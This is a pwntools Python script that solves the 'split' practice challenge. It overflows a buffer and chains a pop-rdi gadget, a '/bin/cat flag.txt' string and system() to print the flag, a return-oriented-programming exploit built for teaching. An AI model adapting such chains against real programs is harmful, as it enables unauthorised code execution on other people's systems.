from pwn import *

# Initialize the ELF
elf = ELF('split')

# Start a new process using the binary file
process = process(elf.path)

# Create the payload with the 40 bytes of filler 
payload = b'A' * 40 

# Add the address of the "pop rdi ; ret" gadget
payload += p64(0x4007c3)

# Add the address of the "/bin/cat flag.txt" string
payload += p64(0x601060) 

# Add the address of the "ret" gadget
payload += p64(0x40053e)

# We can use the pwntools elf utilities to get the address of the system function, which we will then add to the payload
payload += p64(elf.symbols["system"])

# Send the payload to the process
process.send(payload)

# Receive the output and decode it from bytes to string
output = process.recvall()
output = output.decode('utf-8')

# Find the index of the flag in the output
index = output.find('ROPE{')

# Print the flag
flag = output[index:]
print(flag)
